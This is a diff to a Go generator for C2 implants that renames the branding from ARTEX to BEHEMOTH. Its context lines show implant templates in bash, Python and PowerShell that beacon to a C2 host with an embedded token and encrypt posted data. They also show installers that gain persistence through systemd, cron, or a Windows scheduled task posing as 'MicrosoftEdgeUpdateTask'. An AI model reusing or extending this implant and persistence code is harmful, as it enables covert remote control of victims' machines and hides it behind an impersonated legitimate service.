@@ -113,7 +113,7 @@ func ResultURL(im *Implant, baseURL string) string {
 
 func implantReadme(im *Implant) string {
 	var b strings.Builder
-	b.WriteString("ARTEX C2 implant\n\n")
+	b.WriteString("BEHEMOTH C2 implant\n\n")
 	fmt.Fprintf(&b, "id:          %s\n", im.ID)
 	fmt.Fprintf(&b, "label:       %s\n", im.Label)
 	fmt.Fprintf(&b, "platform:    %s (%s)\n", im.Platform, im.Runtime)
@@ -142,7 +142,7 @@ func bashImplant(im *Implant) string {
 		base = "https://C2_HOST"
 	}
 	script := `#!/usr/bin/env bash
-# ARTEX agent helper {{ID}} ({{LABEL}})
+# BEHEMOTH agent helper {{ID}} ({{LABEL}})
 # Keep private: the file embeds the beacon token.
 set -u
 BASE='{{BASE}}'
@@ -215,13 +215,13 @@ post() {
   raw=$(cat)
   if [ "$ENC" = aes ] && command -v openssl >/dev/null 2>&1; then
     local key iv
-    key=$(printf 'artex-c2:%s' "$TOK" | sha | cut -d' ' -f1)
+    key=$(printf 'behemoth-c2:%s' "$TOK" | sha | cut -d' ' -f1)
     iv=$(od -An -tx1 -N16 /dev/urandom | tr -d ' \n')
     body=$(printf '%s' "$raw" | openssl enc -aes-256-cbc -nosalt -K "$key" -iv "$iv" 2>/dev/null | b64)
-    args=(-H "X-Request-ID: $TOK" -H "X-Artex-Enc: aes" -H "X-IV: $iv")
+    args=(-H "X-Request-ID: $TOK" -H "X-Behemoth-Enc: aes" -H "X-IV: $iv")
   else
     body=$(printf '%s' "$raw" | b64)
-    args=(-H "X-Request-ID: $TOK" -H "X-Artex-Enc: none")
+    args=(-H "X-Request-ID: $TOK" -H "X-Behemoth-Enc: none")
   fi
   curl -sS -m 45 -o "$BODY" -D "$HDRS" -w '%{http_code}' -A "$UA" -X POST "${args[@]}" --data-binary "$body" "$url" 2>/dev/null
 }
@@ -393,7 +393,7 @@ func pythonImplant(im *Implant) string {
 		base = "https://C2_HOST"
 	}
 	script := `#!/usr/bin/env python3
-# ARTEX agent helper {{ID}} ({{LABEL}})
+# BEHEMOTH agent helper {{ID}} ({{LABEL}})
 # Keep private: the file embeds the beacon token.
 import base64, json, os, random, socket, subprocess, sys, threading, time, urllib.request
 
@@ -414,7 +414,7 @@ def post(url, obj, timeout=45):
     req.add_header("Content-Type", "application/octet-stream")
     req.add_header("User-Agent", UA)
     req.add_header("X-Request-ID", TOK)
-    req.add_header("X-Artex-Enc", "none")
+    req.add_header("X-Behemoth-Enc", "none")
     with urllib.request.urlopen(req, timeout=timeout) as r:
         code = r.status
         headers = dict(r.headers)
@@ -603,7 +603,7 @@ func powershellImplant(im *Implant) string {
 	if base == "" {
 		base = "https://C2_HOST"
 	}
-	script := `# ARTEX agent helper {{ID}} ({{LABEL}})
+	script := `# BEHEMOTH agent helper {{ID}} ({{LABEL}})
 # Keep private: the file embeds the beacon token.
 $Base = "{{BASE}}"
 $ID = "{{ID}}"
@@ -617,7 +617,7 @@ $Tmo = {{TIMEOUT}}
 $Ver = "{{VER}}"
 $UA = "{{UA}}"
 
-$Key = [System.Text.Encoding]::UTF8.GetBytes(("artex-c2:" + $Tok))
+$Key = [System.Text.Encoding]::UTF8.GetBytes(("behemoth-c2:" + $Tok))
 $Sha = [System.Security.Cryptography.SHA256]::Create()
 $Key = $Sha.ComputeHash($Key)
 
@@ -653,7 +653,7 @@ function ConvertFrom-Encoded([string]$Body, [string]$EncIn, [string]$IVHex) {
 function Post-Json([string]$Url, [string]$Json, [int]$TimeoutSec) {
 
     $p = ConvertTo-Encoded $Json
-    $headers = @{ "X-Request-ID" = $Tok; "X-Artex-Enc" = $p.Enc; "User-Agent" = $UA }
+    $headers = @{ "X-Request-ID" = $Tok; "X-Behemoth-Enc" = $p.Enc; "User-Agent" = $UA }
     if ($p.IV) { $headers["X-IV"] = $p.IV }
     $resp = Invoke-WebRequest -Uri $Url -Method Post -Headers $headers -ContentType "application/octet-stream" -Body $p.Body -TimeoutSec $TimeoutSec -UseBasicParsing
     return $resp
@@ -819,7 +819,7 @@ func bashInstall(im *Implant, persistence string) string {
 	switch persistence {
 	case "systemd":
 		body = `#!/usr/bin/env bash
-# ARTEX installer (systemd) for {{ID}}
+# BEHEMOTH installer (systemd) for {{ID}}
 set -eu
 SRC="$(cd "$(dirname "$0")" && pwd)"
 if [ "$(id -u)" = 0 ]; then LIB=/usr/local/lib; else LIB="$HOME/.local/share"; mkdir -p "$LIB"; fi
@@ -850,7 +850,7 @@ fi
 `
 	case "cron":
 		body = `#!/usr/bin/env bash
-# ARTEX installer (cron) for {{ID}}
+# BEHEMOTH installer (cron) for {{ID}}
 set -eu
 SRC="$(cd "$(dirname "$0")" && pwd)"
 if [ "$(id -u)" = 0 ]; then LIB=/usr/local/lib; else LIB="$HOME/.local/share"; mkdir -p "$LIB"; fi
@@ -864,7 +864,7 @@ echo "installed (cron + running now)"
 `
 	default:
 		body = `#!/usr/bin/env bash
-# ARTEX installer (no persistence) for {{ID}}
+# BEHEMOTH installer (no persistence) for {{ID}}
 set -eu
 SRC="$(cd "$(dirname "$0")" && pwd)"
 if [ "$(id -u)" = 0 ]; then LIB=/usr/local/lib; else LIB="$HOME/.local/share"; mkdir -p "$LIB"; fi
@@ -892,7 +892,7 @@ func powershellInstall(im *Implant, persistence string) string {
 	}
 	var body string
 	if persistence == "schtasks" {
-		body = `# ARTEX installer (scheduled task) for {{ID}}
+		body = `# BEHEMOTH installer (scheduled task) for {{ID}}
 $ErrorActionPreference = "Stop"
 $Src = Split-Path -Parent $MyInvocation.MyCommand.Path
 $Dest = Join-Path $env:ProgramData ".atx"
@@ -906,7 +906,7 @@ Start-ScheduledTask -TaskName "MicrosoftEdgeUpdateTask{{ID}}"
 Write-Host "installed (schtasks MicrosoftEdgeUpdateTask{{ID}})"
 `
 	} else {
-		body = `# ARTEX installer (no persistence) for {{ID}}
+		body = `# BEHEMOTH installer (no persistence) for {{ID}}
 $ErrorActionPreference = "Stop"
 $Src = Split-Path -Parent $MyInvocation.MyCommand.Path
 $Dest = Join-Path $env:ProgramData ".atx"
